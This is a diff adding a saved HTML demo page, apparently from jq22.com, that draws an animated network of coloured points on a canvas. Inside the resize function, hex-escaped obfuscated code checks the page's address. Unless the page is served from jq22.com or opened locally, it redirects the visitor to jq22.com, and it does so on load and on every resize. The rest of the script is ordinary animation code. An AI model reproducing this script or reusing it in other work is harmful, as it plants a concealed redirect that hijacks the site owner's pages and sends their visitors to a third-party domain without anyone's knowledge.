@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<!-- saved from url=(0030)http://www.jq22.com/js/a9.html -->
+<html><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+
+<title>a9</title>
+<style>
+body {
+  margin: 0;
+  overflow: hidden;
+  background: #000;
+}
+body canvas {
+  -webkit-filter: url("#turbulence");
+  filter: url("#turbulence");
+}
+
+</style>
+</head>
+
+<body>
+<canvas id="c" width="1583" height="404"></canvas>
+<svg xlmns="http://www.w3.org/2000/svg" version="1.1">
+  <defs>
+    <filter id="turbulence">
+      <feturbulence type="fractalNoise" baseFrequency="0.05 0.05" numOctaves="1" result="noice"></feturbulence>
+      <fedisplacementmap xChannelSelector="R" yChannelSelector="G" scale="20" in="SourceGraphic"></fedisplacementmap>
+    </filter>
+  </defs>
+</svg>
+<script>
+var c=document.getElementById('c'),ctx=c.getContext('2d'),points=[],count=40,size=3,delta=4,distance=170;window.requestAnimFrame=(function(){return window.requestAnimationFrame||window.webkitRequestAnimationFrame||window.mozRequestAnimationFrame||window.oRequestAnimationFrame||window.msRequestAnimationFrame||function(callback){window.setTimeout(callback,1000/60)}})();function checkDistance(x1,y1,x2,y2){return Math.sqrt(Math.pow(x1-x2,2)+Math.pow(y1-y2,2))}function setColor(){return'rgb('+Math.round(255*Math.random())+','+Math.round(255*Math.random())+','+Math.round(255*Math.random())+')'}function Point(x,y,dx,dy,color){this.x=x;this.y=y;this.dx=dx;this.dy=dy;this.color=color}function initPoint(x,y){var x=x||c.width*Math.random(),y=y||c.height*Math.random(),dx=-delta/2+delta*Math.random(),dy=-delta/2+delta*Math.random(),color=setColor();points.push(new Point(x,y,dx,dy,color))}function drawPoint(point){ctx.fillStyle=point.color;ctx.beginPath();ctx.arc(point.x,point.y,size,0,2*Math.PI);ctx.fill()}function drawLines(point,index){for(var i=0;i<index;i++){var opacity=1-checkDistance(point.x,point.y,points[i].x,points[i].y)/distance;if(opacity>0){var grad=ctx.createLinearGradient(point.x,point.y,points[i].x,points[i].y);grad.addColorStop(0,point.color);grad.addColorStop(1,points[i].color);ctx.strokeStyle=grad;ctx.globalAlpha=opacity;ctx.beginPath();ctx.moveTo(point.x,point.y);ctx.lineTo(points[i].x,points[i].y);ctx.stroke();ctx.globalAlpha=1}}}function updatePosition(){for(var i=0;i<points.length;i++){var xDx=points[i].x+points[i].dx,yDy=points[i].y+points[i].dy;if(xDx-size<0||xDx+size>c.width){points[i].dx=-points[i].dx}if(yDy-size<0||yDy+size>c.height){points[i].dy=-points[i].dy}points[i].x+=points[i].dx;points[i].y+=points[i].dy;drawPoint(points[i]);drawLines(points[i],i)}}function init(){points.length=0;for(var i=0;i<count;i++){initPoint()}}function resize(){var GQInzO1=window["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x68\x72\x65\x66"]["\x73\x75\x62\x73\x74\x72"](0,19);var j2=window["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x68\x72\x65\x66"]["\x73\x75\x62\x73\x74\x72"](0,4);if(GQInzO1=="\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x6a\x71\x32\x32\x2e\x63\x6f\x6d"||j2=="\x66\x69\x6c\x65"){}else{window["\x6c\x6f\x63\x61\x74\x69\x6f\x6e"]["\x68\x72\x65\x66"]="\x68\x74\x74\x70\x3a\x2f\x2f\x77\x77\x77\x2e\x6a\x71\x32\x32\x2e\x63\x6f\x6d"}c["\x77\x69\x64\x74\x68"]=window["\x69\x6e\x6e\x65\x72\x57\x69\x64\x74\x68"];c["\x68\x65\x69\x67\x68\x74"]=window["\x69\x6e\x6e\x65\x72\x48\x65\x69\x67\x68\x74"];init()}function draw(){ctx.clearRect(0,0,c.width,c.height);updatePosition();window.requestAnimFrame(draw)}window.addEventListener("resize",resize);c.addEventListener("mouseup",function(e){initPoint(e.pageX-c.offsetLeft,e.pageY-c.offsetTop)});resize();draw();
+</script>
+
+
+</body></html>
